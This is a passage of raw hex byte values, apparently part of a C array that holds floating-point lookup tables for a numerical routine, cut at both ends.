0x3, 0x57, 0x60, 0x40, 0x15, 0x3e, 0x60, 0x1b, 0x7a, 0x94, 0x8b, 0xd1, 0xc, 0x3e, 0x7e, 0xa9, 0x7c, 0x27, 0x65, 0xad, 0x17, 0x3e, 0xa9, 0x5f, 0x9f, 0xc5, 0x4d, 0x88, 0x11, 0x3e, 0x82, 0xd0, 0x6, 0x60, 0xc4, 0x11, 0x17, 0x3e, 0xf8, 0x8, 0x31, 0x3c, 0x2e, 0x9, 0x2f, 0x3e, 0x3a, 0xe1, 0x2b, 0xe3, 0xc5, 0x14, 0x17, 0x3e, 0x9a, 0x4f, 0x73, 0xfd, 0xa7, 0xbb, 0x26, 0x3e, 0x83, 0x84, 0xe0, 0xb5, 0x8f, 0xf4, 0xfd, 0x3d, 0x95, 0xb, 0x4d, 0xc7, 0x9b, 0x2f, 0x23, 0x3e, 0x13, 0xc, 0x79, 0x48, 0xe8, 0x73, 0xf9, 0x3d, 0x6e, 0x58, 0xc6, 0x8, 0xbc, 0xcc, 0x1e, 0x3e, 0x98, 0x4a, 0x52, 0xf9, 0xe9, 0x15, 0x21, 0x3e, 0xb8, 0x31, 0x31, 0x59, 0x40, 0x17, 0x2f, 0x3e, 0x35, 0x38, 0x64, 0x25, 0x8b, 0xcf, 0x1b, 0x3e, 0x80, 0xed, 0x8b, 0x1d, 0xa8, 0x5f, 0x1f, 0x3e, 0xe4, 0xd9, 0x29, 0xf9, 0x4d, 0x4a, 0x24, 0x3e, 0x94, 0xc, 0x22, 0xd8, 0x20, 0x98, 0x12, 0x3e, 0x9, 0xe3, 0x4, 0x93, 0x48, 0xb, 0x2a, 0x3e, 0xfe, 0x65, 0xa6, 0xab, 0x56, 0x4d, 0x1f, 0x3e, 0x63, 0x51, 0x36, 0x19, 0x90, 0xc, 0x21, 0x3e, 0x36, 0x27, 0x59, 0xfe, 0x78, 0xf, 0xf8, 0x3d, 0xca, 0x1c, 0xc8, 0x25, 0x88, 0x52, 0x10, 0x3e, 0x6a, 0x74, 0x6d, 0x7d, 0x53, 0x95, 0xe0, 0x3d, 0x60, 0x6, 0xa, 0xa7, 0xbf, 0x27, 0x18, 0x3e, 0x3c, 0x93, 0x45, 0xec, 0xa8, 0xb0, 0x6, 0x3e, 0xa9, 0xdb, 0xf5, 0x1b, 0xf8, 0x5a, 0x10, 0x3e, 0x15, 0xd5, 0x55, 0x26, 0xfa, 0xe2, 0x17, 0x3e, 0xbf, 0xe4, 0xae, 0xbf, 0xec, 0x59, 0xd, 0x3e, 0xa3, 0x3f, 0x68, 0xda, 0x2f, 0x8b, 0x1d, 0x3e, 0x37, 0x37, 0x3a, 0xfd, 0xdd, 0xb8, 0x24, 0x3e, 0x4, 0x12, 0xae, 0x61, 0x7e, 0x82, 0x13, 0x3e, 0x9f, 0xf, 0xe9, 0x49, 0x7b, 0x8c, 0x2c, 0x3e, 0x1d, 0x59, 0x97, 0x15, 0xf0, 0xea, 0x29, 0x3e, 0x36, 0x7b, 0x31, 0x6e, 0xa6, 0xaa, 0x19, 0x3e, 0x55, 0x6, 0x72, 0x9, 0x56, 0x72, 0x2e, 0x3e, 0x54, 0xac, 0x7a, 0xfc, 0x33, 0x1c, 0x26, 0x3e, 0x52, 0xa2, 0x61, 0xcf, 0x2b, 0x66, 0x29, 0x3e, 0x30, 0x27, 0xc4, 0x11, 0xc8, 0x43, 0x18, 0x3e, 0x36, 0xcb, 0x5a, 0xb, 0xbb, 0x64, 0x20, 0x3e, 0xa4, 0x1, 0x27, 0x84, 0xc, 0x34, 0xa, 0x3e, 0xd6, 0x79, 0x8f, 0xb5, 0x55, 0x8e, 0x1a, 0x3e, 0x9a, 0x9d, 0x5e, 0x9c, 0x21, 0x2d, 0xe9, 0x3d, 0x6a, 0xfd, 0x7f, 0xd, 0xe6, 0x63, 0x3f, 0x3e, 0x14, 0x63, 0x51, 0xd9, 0xe, 0x9b, 0x2e, 0x3e, 0xc, 0x35, 0x62, 0x19, 0x90, 0x23, 0x29, 0x3e, 0x81, 0x5e, 0x78, 0x38, 0x88, 0x6f, 0x32, 0x3e, 0xaf, 0xa6, 0xab, 0x4c, 0x6a, 0x5b, 0x3b, 0x3e, 0x1c, 0x76, 0x8e, 0xdc, 0x6a, 0x22, 0xf0, 0x3d, 0xed, 0x1a, 0x3a, 0x31, 0xd7, 0x4a, 0x3c, 0x3e, 0x17, 0x8d, 0x73, 0x7c, 0xe8, 0x64, 0x15, 0x3e, 0x18, 0x66, 0x8a, 0xf1, 0xec, 0x8f, 0x33, 0x3e, 0x66, 0x76, 0x77, 0xf5, 0x9e, 0x92, 0x3d, 0x3e, 0xb8, 0xa0, 0x8d, 0xf0, 0x3b, 0x48, 0x39, 0x3e, 0x26, 0x58, 0xaa, 0xee, 0xe, 0xdd, 0x3b, 0x3e, 0xba, 0x37, 0x2, 0x59, 0xdd, 0xc4, 0x39, 0x3e, 0xc7, 0xca, 0xeb, 0xe0, 0xe9, 0xf3, 0x1a, 0x3e, 0xac, 0xd, 0x27, 0x82, 0x53, 0xce, 0x35, 0x3e, 0xba, 0xb9, 0x2a, 0x53, 0x74, 0x4f, 0x39, 0x3e, 0x54, 0x86, 0x88, 0x95, 0x27, 0x34, 0x7, 0x3e, 0xf0, 0x4b, 0xe3, 0xb, 0x0, 0x5a, 0xc, 0x3e, 0x82, 0xd0, 0x6, 0x60, 0xc4, 0x11, 0x27, 0x3e, 0xf8, 0x8c, 0xed, 0xb4, 0x25, 0x0, 0x25, 0x3e, 0xa0, 0xd2, 0xf2, 0xce, 0x8b, 0xd1, 0x2e, 0x3e, 0x54, 0x75, 0xa, 0xc, 0x2e, 0x28, 0x21, 0x3e, 0xca, 0xa7, 0x59, 0x33, 0xf3, 0x70, 0xd, 0x3e, 0x25, 0x40, 0xa8, 0x13, 0x7e, 0x7f, 0x2b, 0x3e, 0x1e, 0x89, 0x21, 0xc3, 0x6e, 0x30, 0x33, 0x3e, 0x50, 0x75, 0x8b, 0x3, 0xf8, 0xc7, 0x3f, 0x3e, 0x64, 0x1d, 0xd7, 0x8c, 0x35, 0xb0, 0x3e, 0x3e, 0x74, 0x94, 0x85, 0x22, 0xc8, 0x76, 0x3a, 0x3e, 0xe3, 0x86, 0xde, 0x52, 0xc6, 0xe, 0x3d, 0x3e, 0xaf, 0x58, 0x86, 0xe0, 0xcc, 0xa4, 0x2f, 0x3e, 0x9e, 0xa, 0xc0, 0xd2, 0xa2, 0x84, 0x3b, 0x3e, 0xd1, 0x5b, 0xc2, 0xf2, 0xb0, 0xa5, 0x20, 0x3e, 0x99, 0xf6, 0x5b, 0x22, 0x60, 0xd6, 0x3d, 0x3e, 0x37, 0xf0, 0x9b, 0x85, 0xf, 0xb1, 0x8, 0x3e, 0xe1, 0xcb, 0x90, 0xb5, 0x23, 0x88, 0x3e, 0x3e, 0xf6, 0x96, 0x1e, 0xf3, 0x11, 0x13, 0x36, 0x3e, 0x9a, 0xf, 0xa2, 0x5c, 0x87, 0x1f, 0x2e, 0x3e, 0xa5, 0xb9, 0x39, 0x49, 0x72, 0x95, 0x2c, 0x3e, 0xe2, 0x58, 0x3e, 0x7a, 0x95, 0x5, 0x38, 0x3e, 0x34, 0x3, 0x9f, 0xea, 0x26, 0xf1, 0x2f, 0x3e, 0x9, 0x56, 0x8e, 0x59, 0xf5, 0x53, 0x39, 0x3e, 0x48, 0xc4, 0x56, 0xf8, 0x6f, 0xc1, 0x36, 0x3e, 0xf4, 0x61, 0xf2, 0xf, 0x22, 0xcb, 0x24, 0x3e, 0xa2, 0x53, 0x3d, 0xd5, 0x20, 0xe1, 0x35, 0x3e, 0x56, 0xf2, 0x89, 0x61, 0x7f, 0x52, 0x3a, 0x3e, 0xf, 0x9c, 0xd4, 0xff, 0xfc, 0x56, 0x38, 0x3e, 0xda, 0xd7, 0x28, 0x82, 0x2e, 0xc, 0x30, 0x3e, 0xe0, 0xdf, 0x44, 0x94, 0xd0, 0x13, 0xf1, 0x3d, 0xa6, 0x59, 0xea, 0xe, 0x63, 0x10, 0x25, 0x3e, 0x11, 0xd7, 0x32, 0xf, 0x78, 0x2e, 0x26, 0x3e, 0xcf, 0xf8, 0x10, 0x1a, 0xd9, 0x3e, 0xed, 0x3d, 0x85, 0xcd, 0x4b, 0x7e, 0x4a, 0x65, 0x23, 0x3e, 0x21, 0xad, 0x80, 0x49, 0x78, 0x5b, 0x5, 0x3e, 0x64, 0x6e, 0xb1, 0xd4, 0x2d, 0x2f, 0x21, 0x3e, 0xc, 0xf5, 0x39, 0xd9, 0xad, 0xc4, 0x37, 0x3e, 0xfc, 0x80, 0x71, 0x62, 0x84, 0x17, 0x28, 0x3e, 0x61, 0x49, 0xe1, 0xc7, 0x62, 0x51, 0xea, 0x3d, 0x63, 0x51, 0x36, 0x19, 0x90, 0xc, 0x31, 0x3e, 0x88, 0x76, 0xa1, 0x2b, 0x4d, 0x3c, 0x37, 0x3e, 0x81, 0x3d, 0xe9, 0xe0, 0xa5, 0xe8, 0x2a, 0x3e, 0xaf, 0x21, 0x16, 0xf0, 0xc6, 0xb0, 0x2a, 0x3e, 0x66, 0x5b, 0xdd, 0x74, 0x8b, 0x1e, 0x30, 0x3e, 0x94, 0x54, 0xbb, 0xec, 0x6f, 0x20, 0x2d, 0x3e, 0x0, 0xcc, 0x4f, 0x72, 0x8b, 0xb4, 0xf0, 0x3d, 0x29, 0xe2, 0x61, 0xb, 0x1f, 0x83, 0x3f, 0x3e, 0xaf, 0xbc, 0x7, 0xc4, 0x97, 0x1a, 0xf8, 0x3d, 0xaa, 0xb7, 0xcb, 0x1c, 0x6c, 0x28, 0x3e, 0x3e, 0x93, 0xa, 0x22, 0x49, 0xb, 0x63, 0x28, 0x3e, 0x5c, 0x2c, 0xa2, 0xc1, 0x15, 0xb, 0xff, 0x3d, 0x46, 0x9, 0x1c, 0xe7, 0x45, 0x54, 0x35, 0x3e, 0x85, 0x6d, 0x6, 0xf8, 0x30, 0xe6, 0x3b, 0x3e, 0x39, 0x6c, 0xd9, 0xf0, 0xdf, 0x99, 0x25, 0x3e, 0x81, 0xb0, 0x8f, 0xb1, 0x85, 0xcc, 0x36, 0x3e, 0xc8, 0xa8, 0x1e, 0x0, 0x6d, 0x47, 0x34, 0x3e, 0x1f, 0xd3, 0x16, 0x9e, 0x88, 0x3f, 0x37, 0x3e, 0x87, 0x2a, 0x79, 0xd, 0x10, 0x57, 0x33, 0x3e, 0xf6, 0x1, 0x61, 0xae, 0x79, 0xd1, 0x3b, 0x3e, 0xe2, 0xf6, 0xc3, 0x56, 0x10, 0xa3, 0xc, 0x3e, 0xfb, 0x8, 0x9c, 0x62, 0x70, 0x28, 0x3d, 0x3e, 0x3f, 0x67, 0xd2, 0x80, 0x38, 0xba, 0x3a, 0x3e, 0xa6, 0x7d, 0x29, 0xcb, 0x33, 0x36, 0x2c, 0x3e, 0x2, 0xea, 0xef, 0x99, 0x38, 0x84, 0x21, 0x3e, 0xe6, 0x8, 0x20, 0x9d, 0xc9, 0xcc, 0x3b, 0x3e, 0x50, 0xd3, 0xbd, 0x44, 0x5, 0x0, 0x38, 0x3e, 0xe1, 0x6a, 0x60, 0x26, 0xc2, 0x91, 0x2b, 0x3e, 0xdf, 0x2b, 0xb6, 0x26, 0xdf, 0x7a, 0x2a, 0x3e, 0xc9, 0x6e, 0x82, 0xc8, 0x4f, 0x76, 0x18, 0x3e, 0xf0, 0x68, 0xf, 0xe5, 0x3d, 0x4f, 0x1f, 0x3e, 0xe3, 0x95, 0x79, 0x75, 0xca, 0x60, 0xf7, 0x3d, 0x47, 0x51, 0x80, 0xd3, 0x7e, 0x66, 0xfc, 0x3d, 0x6f, 0xdf, 0x6a, 0x19, 0xf6, 0x33, 0x37, 0x3e, 0x6b, 0x83, 0x3e, 0xf3, 0x10, 0xb7, 0x2f, 0x3e, 0x13, 0x10, 0x64, 0xba, 0x6e, 0x88, 0x39, 0x3e, 0x1a, 0x8c, 0xaf, 0xd0, 0x68, 0x53, 0xfb, 0x3d, 0x71, 0x29, 0x8d, 0x1b, 0x69, 0x8c, 0x35, 0x3e, 0xfb, 0x8, 0x6d, 0x22, 0x65, 0x94, 0xfe, 0x3d, 0x97, 0x0, 0x3f, 0x6, 0x7e, 0x58, 0x33, 0x3e, 0x18, 0x9f, 0x12, 0x2, 0xe7, 0x18, 0x36, 0x3e, 0x54, 0xac, 0x7a, 0xfc, 0x33, 0x1c, 0x36, 0x3e, 0x4a, 0x60, 0x8, 0x84, 0xa6, 0x7, 0x3f, 0x3e, 0x21, 0x54, 0x94, 0xe4, 0xbf, 0x34, 0x3c, 0x3e, 0xb, 0x30, 0x41, 0xe, 0xf0, 0xb1, 0x38, 0x3e, 0x63, 0x1b, 0xd6, 0x84, 0x42, 0x43, 0x3f, 0x3e, 0x36, 0x74, 0x39, 0x5e, 0x9, 0x63, 0x3a, 0x3e, 0xde, 0x19, 0xb9, 0x56, 0x86, 0x42, 0x34, 0x3e, 0xa6, 0xd9, 0xb2, 0x1, 0x92, 0xca, 0x36, 0x3e, 0x1c, 0x93, 0x2a, 0x3a, 0x82, 0x38, 0x27, 0x3e, 0x30, 0x92, 0x17, 0xe, 0x88, 0x11, 0x3c, 0x3e, 0xfe, 0x52, 0x6d, 0x8d, 0xdc, 0x3d, 0x31, 0x3e, 0x17, 0xe9, 0x22, 0x89, 0xd5, 0xee, 0x33, 0x3e, 0x50, 0xdd, 0x6b, 0x84, 0x92, 0x59, 0x29, 0x3e, 0x8b, 0x27, 0x2e, 0x5f, 0x4d, 0xdb, 0xd, 0x3e, 0xc4, 0x35, 0x6, 0x2a, 0xf1, 0xa5, 0xf1, 0x3d, 0x34, 0x3c, 0x2c, 0x88, 0xf0, 0x42, 0x46, 0x3e, 0x5e, 0x47, 0xf6, 0xa7, 0x9b, 0xee, 0x2a, 0x3e, 0xe4, 0x60, 0x4a, 0x83, 0x7f, 0x4b, 0x26, 0x3e, 0x2e, 0x79, 0x43, 0xe2, 0x42, 0xd, 0x29, 0x3e, 0x1, 0x4f, 0x13, 0x8, 0x20, 0x27, 0x4c, 0x3e, 0x5b, 0xcf, 0xd6, 0x16, 0x2e, 0x78, 0x4a, 0x3e, 0x48, 0x66, 0xda, 0x79, 0x5c, 0x50, 0x44, 0x3e, 0x21, 0xcd, 0x4d, 0xea, 0xd4, 0xa9, 0x4c, 0x3e, 0xbc, 0xd5, 0x7c, 0x62, 0x3d, 0x7d, 0x29, 0x3e, 0x13, 0xaa, 0xbc, 0xf9, 0x5c, 0xb1, 0x20, 0x3e, 0xdd, 0x76, 0xcf, 0x63, 0x20, 0x5b, 0x31, 0x3e, 0x48, 0x27, 0xaa, 0xf3, 0xe6, 0x83, 0x29, 0x3e, 0x94, 0xe9, 0xff, 0xf4, 0x64, 0x4c, 0x3f, 0x3e, 0xf, 0x5a, 0xe8, 0x7c, 0xba, 0xbe, 0x46, 0x3e, 0xb8, 0xa6, 0x4e, 0xfd, 0x69, 0x9c, 0x3b, 0x3e, 0xab, 0xa4, 0x5f, 0x83, 0xa5, 0x6a, 0x2b, 0x3e, 0xd1, 0xed, 0xf, 0x79, 0xc3, 0xcc, 0x43, 0x3e, 0xe0, 0x4f, 0x40, 0xc4, 0x4c, 0xc0, 0x29, 0x3e, 0x9d, 0xd8, 0x75, 0x7a, 0x4b, 0x73, 0x40, 0x3e, 0x12, 0x16, 0xe0, 0xc4, 0x4, 0x44, 0x1b, 0x3e, 0x94, 0x48, 0xce, 0xc2, 0x65, 0xc5, 0x40, 0x3e, 0xcd, 0x35, 0xd9, 0x41, 0x14, 0xc7, 0x33, 0x3e, 0x4e, 0x3b, 0x6b, 0x55, 0x92, 0xa4, 0x72, 0x3d, 0x43, 0xdc, 0x41, 0x3, 0x9, 0xfa, 0x20, 0x3e, 0xf4, 0xd9, 0xe3, 0x9, 0x70, 0x8f, 0x2e, 0x3e, 0x45, 0x8a, 0x4, 0x8b, 0xf6, 0x1b, 0x4b, 0x3e, 0x56, 0xa9, 0xfa, 0xdf, 0x52, 0xee, 0x3e, 0x3e, 0xbd, 0x65, 0xe4, 0x0, 0x9, 0x6b, 0x45, 0x3e, 0x66, 0x76, 0x77, 0xf5, 0x9e, 0x92, 0x4d, 0x3e, 0x60, 0xe2, 0x37, 0x86, 0xa2, 0x6e, 0x48, 0x3e, 0xf0, 0xa2, 0xc, 0xf1, 0xaf, 0x65, 0x46, 0x3e, 0x74, 0xec, 0x48, 0xaf, 0xfd, 0x11, 0x2f, 0x3e, 0xc7, 0xd1, 0xa4, 0x86, 0x1b, 0xbe, 0x4c, 0x3e, 0x65, 0x76, 0xa8, 0xfe, 0x5b, 0xb0, 0x25, 0x3e, 0x1d, 0x4a, 0x1a, 0xa, 0xc2, 0xce, 0x41, 0x3e, 0x9f, 0x9b, 0x40, 0xa, 0x5f, 0xcd, 0x41, 0x3e, 0x70, 0x50, 0x26, 0xc8, 0x56, 0x36, 0x45, 0x3e, 0x60, 0x22, 0x28, 0x35, 0xd8, 0x7e, 0x37, 0x3e, 0xd2, 0xb9, 0x40, 0x30, 0xbc, 0x17, 0x24, 0x3e, 0xf2, 0xef, 0x79, 0x7b, 0xef, 0x8e, 0x40, 0x3e, 0xe9, 0x57, 0xdc, 0x39, 0x6f, 0xc7, 0x4d, 0x3e, 0x57, 0xf4, 0xc, 0xa7, 0x93, 0x4, 0x4c, 0x3e, 0xc, 0xa6, 0xa5, 0xce, 0xd6, 0x83, 0x4a, 0x3e, 0xba, 0x57, 0xc5, 0xd, 0x70, 0xd6, 0x30, 0x3e, 0xa, 0xbd, 0xe8, 0x12, 0x6c, 0xc9, 0x44, 0x3e, 0x15, 0x23, 0xe3, 0x93, 0x19, 0x2c, 0x3d, 0x3e, 0x42, 0x82, 0x5f, 0x13, 0x21, 0xc7, 0x22, 0x3e, 0x7d, 0x74, 0xda, 0x4d, 0x3e, 0x9a, 0x27, 0x3e, 0x2b, 0xa7, 0x41, 0x69, 0x9f, 0xf8, 0xfc, 0x3d, 0x31, 0x8, 0xf1, 0x2, 0xa7, 0x49, 0x21, 0x3e, 0xdb, 0x75, 0x81, 0x7c, 0x4b, 0xad, 0x4e, 0x3e, 0xa, 0xe7, 0x63, 0xfe, 0x30, 0x69, 0x4e, 0x3e, 0x2f, 0xee, 0xd9, 0xbe, 0x6, 0xe1, 0x41, 0x3e, 0x92, 0x1c, 0xf1, 0x82, 0x2b, 0x68, 0x2d, 0x3e, 0x7c, 0xa4, 0xdb, 0x88, 0xf1, 0x7, 0x3a, 0x3e, 0xf6, 0x72, 0xc1, 0x2d, 0x34, 0xf9, 0x40, 0x3e, 0x25, 0x3e, 0x62, 0xde, 0x3f, 0xef, 0x3, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x20, 0xe0, 0x1f, 0xe0, 0x1f, 0xe0, 0xff, 0x3f, 0xf0, 0x7, 0xfc, 0x1, 0x7f, 0xc0, 0xff, 0x3f, 0x12, 0xfa, 0x1, 0xaa, 0x1c, 0xa1, 0xff, 0x3f, 0x20, 0xf8, 0x81, 0x1f, 0xf8, 0x81, 0xff, 0x3f, 0xb5, 0xdb, 0xa0, 0xac, 0x10, 0x63, 0xff, 0x3f, 0x71, 0x42, 0x4a, 0x9e, 0x65, 0x44, 0xff, 0x3f, 0xb5, 0xa, 0x23, 0x44, 0xf6, 0x25, 0xff, 0x3f, 0x8, 0x1f, 0x7c, 0xf0, 0xc1, 0x7, 0xff, 0x3f, 0x2, 0x8e, 0x45, 0xf8, 0xc7, 0xe9, 0xfe, 0x3f, 0xc0, 0xec, 0x1, 0xb3, 0x7, 0xcc, 0xfe, 0x3f, 0xeb, 0x1, 0xba, 0x7a, 0x80, 0xae, 0xfe, 0x3f, 0x67, 0xb7, 0xf0, 0xab, 0x31, 0x91, 0xfe, 0x3f, 0xe4, 0x50, 0x97, 0xa5, 0x1a, 0x74, 0xfe, 0x3f, 0x74, 0xe5, 0x1, 0xc9, 0x3a, 0x57, 0xfe, 0x3f, 0x73, 0x1a, 0xdc, 0x79, 0x91, 0x3a, 0xfe, 0x3f, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0xfe, 0x3f, 0x1e, 0xe0, 0x1, 0x1e, 0xe0, 0x1, 0xfe, 0x3f, 0x8a, 0x86, 0xf8, 0xe3, 0xd6, 0xe5, 0xfd, 0x3f, 0xca, 0x1d, 0xa0, 0xdc, 0x1, 0xca, 0xfd, 0x3f, 0xdb, 0x81, 0xb9, 0x76, 0x60, 0xae, 0xfd, 0x3f, 0x8a, 0x7f, 0x1e, 0x23, 0xf2, 0x92, 0xfd, 0x3f, 0x34, 0x2c, 0xb8, 0x54, 0xb6, 0x77, 0xfd, 0x3f, 0xb2, 0x72, 0x75, 0x80, 0xac, 0x5c, 0xfd, 0x3f, 0x1d, 0xd4, 0x41, 0x1d, 0xd4, 0x41, 0xfd, 0x3f, 0x1a, 0x5b, 0xfc, 0xa3, 0x2c, 0x27, 0xfd, 0x3f, 0x74, 0xc0, 0x6e, 0x8f, 0xb5, 0xc, 0xfd, 0x3f, 0xc6, 0xbf, 0x44, 0x5c, 0x6e, 0xf2, 0xfc, 0x3f, 0xb, 0x9b, 0x3, 0x89, 0x56, 0xd8, 0xfc, 0x3f, 0xe7, 0xcb, 0x1, 0x96, 0x6d, 0xbe, 0xfc, 0x3f, 0x91, 0xe1, 0x5e, 0x5, 0xb3, 0xa4, 0xfc, 0x3f, 0x42, 0x8a, 0xfb, 0x5a, 0x26, 0x8b, 0xfc, 0x3f, 0x1c, 0xc7, 0x71, 0x1c, 0xc7, 0x71, 0xfc, 0x3f, 0x86, 0x49, 0xd, 0xd1, 0x94, 0x58, 0xfc, 0x3f, 0xf0, 0xf8, 0xc3, 0x1, 0x8f, 0x3f, 0xfc, 0x3f, 0x1c, 0xa0, 0x2e, 0x39, 0xb5, 0x26, 0xfc, 0x3f, 0xe0, 0xc0, 0x81, 0x3, 0x7, 0xe, 0xfc, 0x3f, 0x8b, 0x8d, 0x86, 0xee, 0x83, 0xf5, 0xfb, 0x3f, 0xf7, 0x6, 0x94, 0x89, 0x2b, 0xdd, 0xfb, 0x3f, 0x7b, 0x3e, 0x88, 0x65, 0xfd, 0xc4, 0xfb, 0x3f, 0xd0, 0xba, 0xc1, 0x14, 0xf9, 0xac, 0xfb, 0x3f, 0x23, 0xff, 0x18, 0x2b, 0x1e, 0x95, 0xfb, 0x3f, 0x8b, 0x33, 0xda, 0x3d, 0x6c, 0x7d, 0xfb, 0x3f, 0x5, 0xee, 0xbe, 0xe3, 0xe2, 0x65, 0xfb, 0x3f, 0x4f, 0x1b, 0xe8, 0xb4, 0x81, 0x4e, 0xfb, 0x3f, 0xce, 0x6, 0xd8, 0x4a, 0x48, 0x37, 0xfb, 0x3f, 0xd9, 0x80, 0x6c, 0x40, 0x36, 0x20, 0xfb, 0x3f, 0xa4, 0x22, 0xd9, 0x31, 0x4b, 0x9, 0xfb, 0x3f, 0x28, 0xaf, 0xa1, 0xbc, 0x86, 0xf2, 0xfa, 0x3f, 0x5e, 0x90, 0x94, 0x7f, 0xe8, 0xdb, 0xfa, 0x3f, 0x1b, 0x70, 0xc5, 0x1a, 0x70, 0xc5, 0xfa, 0x3f, 0xfd, 0xeb, 0x87, 0x2f, 0x1d, 0xaf, 0xfa, 0x3f, 0xbe, 0x63, 0x6a, 0x60, 0xef, 0x98, 0xfa, 0x3f, 0x59, 0xe1, 0x30, 0x51, 0xe6, 0x82, 0xfa, 0x3f, 0x6d, 0x1a, 0xd0, 0xa6, 0x1, 0x6d, 0xfa, 0x3f, 0x4a, 0x8a, 0x68, 0x7, 0x41, 0x57, 0xfa, 0x3f, 0x1a, 0xa4, 0x41, 0x1a, 0xa4, 0x41, 0xfa, 0x3f, 0xa0, 0x1c, 0xc5, 0x87, 0x2a, 0x2c, 0xfa, 0x3f, 0x2, 0x4b, 0x7a, 0xf9, 0xd3, 0x16, 0xfa, 0x3f, 0x1a, 0xa0, 0x1, 0x1a, 0xa0, 0x1, 0xfa, 0x3f, 0xd9, 0x33, 0x10, 0x95, 0x8e, 0xec, 0xf9, 0x3f, 0x2d, 0x68, 0x6b, 0x17, 0x9f, 0xd7, 0xf9, 0x3f, 0x2, 0xa1, 0xe4, 0x4e, 0xd1, 0xc2, 0xf9, 0x3f, 0xda, 0x10, 0x55, 0xea, 0x24, 0xae, 0xf9, 0x3f, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xf9, 0x3f, 0xff, 0xc0, 0x8e, 0xd, 0x2f, 0x85, 0xf9, 0x3f, 0x72, 0xb8, 0xc, 0xf8, 0xe4, 0x70, 0xf9, 0x3f, 0xae, 0x77, 0xe3, 0xb, 0xbb, 0x5c, 0xf9, 0x3f, 0xe0, 0xe9, 0xd6, 0xfc, 0xb0, 0x48, 0xf9, 0x3f, 0xe6, 0x2c, 0x9b, 0x7f, 0xc6, 0x34, 0xf9, 0x3f, 0x29, 0xe2, 0xd0, 0x49, 0xfb, 0x20, 0xf9, 0x3f, 0xd5, 0x90, 0x1, 0x12, 0x4f, 0xd, 0xf9, 0x3f, 0xfa, 0x18, 0x9c, 0x8f, 0xc1, 0xf9, 0xf8, 0x3f, 0x3f, 0x37, 0xf1, 0x7a, 0x52, 0xe6, 0xf8, 0x3f, 0xd3, 0x18, 0x30, 0x8d, 0x1, 0xd3, 0xf8, 0x3f, 0x3a, 0xff, 0x62, 0x80, 0xce, 0xbf, 0xf8, 0x3f, 0xaa, 0xf3, 0x6b, 0xf, 0xb9, 0xac, 0xf8, 0x3f, 0x9c, 0x89, 0x1, 0xf6, 0xc0, 0x99, 0xf8, 0x3f, 0x4a, 0xb0, 0xab, 0xf0, 0xe5, 0x86, 0xf8, 0x3f, 0xb9, 0x92, 0xc0, 0xbc, 0x27, 0x74, 0xf8, 0x3f, 0x18, 0x86, 0x61, 0x18, 0x86, 0x61, 0xf8, 0x3f, 0x14, 0x6, 0x78, 0xc2, 0x0, 0x4f, 0xf8, 0x3f, 0xdd, 0xbe, 0xb2, 0x7a, 0x97, 0x3c, 0xf8, 0x3f, 0xa0, 0xa4, 0x82, 0x1, 0x4a, 0x2a, 0xf8, 0x3f, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0xf8, 0x3f, 0x6, 0x18, 0x60, 0x80, 0x1, 0x6, 0xf8, 0x3f, 0x40, 0x7f, 0x1, 0xfd, 0x5, 0xf4, 0xf7, 0x3f, 0x1d, 0x4f, 0x5a, 0x51, 0x25, 0xe2, 0xf7, 0x3f, 0xf4, 0x5, 0x7d, 0x41, 0x5f, 0xd0, 0xf7, 0x3f, 0x7c, 0x1, 0x2e, 0x92, 0xb3, 0xbe, 0xf7, 0x3f, 0xc3, 0xec, 0xe0, 0x8, 0x22, 0xad, 0xf7, 0x3f, 0x8b, 0x39, 0xb6, 0x6b, 0xaa, 0x9b, 0xf7, 0x3f, 0xc8, 0xa4, 0x78, 0x81, 0x4c, 0x8a, 0xf7, 0x3f, 0xd, 0xc6, 0x9a, 0x11, 0x8, 0x79, 0xf7, 0x3f, 0xb1, 0xa9, 0x34, 0xe4, 0xdc, 0x67, 0xf7, 0x3f, 0x6d, 0x75, 0x1, 0xc2, 0xca, 0x56, 0xf7, 0x3f, 0x46, 0x17, 0x5d, 0x74, 0xd1, 0x45, 0xf7, 0x3f, 0x8d, 0xfe, 0x41, 0xc5, 0xf0, 0x34, 0xf7, 0x3f, 0xbc, 0xde, 0x46, 0x7f, 0x28, 0x24, 0xf7, 0x3f, 0x9, 0x7c, 0x9c, 0x6d, 0x78, 0x13, 0xf7, 0x3f, 0x70, 0x81, 0xb, 0x5c, 0xe0, 0x2, 0xf7, 0x3f, 0x17, 0x60, 0xf2, 0x16, 0x60, 0xf2, 0xf6, 0x3f, 0xc7, 0x37, 0x43, 0x6b, 0xf7, 0xe1, 0xf6, 0x3f, 0x61, 0xc8, 0x81, 0x26, 0xa6, 0xd1, 0xf6, 0x3f, 0x17, 0x6c, 0xc1, 0x16, 0x6c, 0xc1, 0xf6, 0x3f, 0x3d, 0x1a, 0xa3, 0xa, 0x49, 0xb1, 0xf6, 0x3f, 0x90, 0x72, 0x53, 0xd1, 0x3c, 0xa1, 0xf6, 0x3f, 0xc0, 0xd0, 0x88, 0x3a, 0x47, 0x91, 0xf6, 0x3f, 0x17, 0x68, 0x81, 0x16, 0x68, 0x81, 0xf6, 0x3f, 0x1a, 0x67, 0x1, 0x36, 0x9f, 0x71, 0xf6, 0x3f, 0xf9, 0x22, 0x51, 0x6a, 0xec, 0x61, 0xf6, 0x3f, 0xa3, 0x4a, 0x3b, 0x85, 0x4f, 0x52, 0xf6, 0x3f, 0x64, 0x21, 0xb, 0x59, 0xc8, 0x42, 0xf6, 0x3f, 0xde, 0xc0, 0x8a, 0xb8, 0x56, 0x33, 0xf6, 0x3f, 0x40, 0x62, 0x1, 0x77, 0xfa, 0x23, 0xf6, 0x3f, 0x94, 0xae, 0x31, 0x68, 0xb3, 0x14, 0xf6, 0x3f, 0x6, 0x16, 0x58, 0x60, 0x81, 0x5, 0xf6, 0x3f, 0xfc, 0x2d, 0x29, 0x34, 0x64, 0xf6, 0xf5, 0x3f, 0xe7, 0x15, 0xd0, 0xb8, 0x5b, 0xe7, 0xf5, 0x3f, 0xa5, 0xe2, 0xec, 0xc3, 0x67, 0xd8, 0xf5, 0x3f, 0x57, 0x10, 0x93, 0x2b, 0x88, 0xc9, 0xf5, 0x3f, 0x91, 0xfa, 0x47, 0xc6, 0xbc, 0xba, 0xf5, 0x3f, 0xc0, 0x5a, 0x1, 0x6b, 0x5, 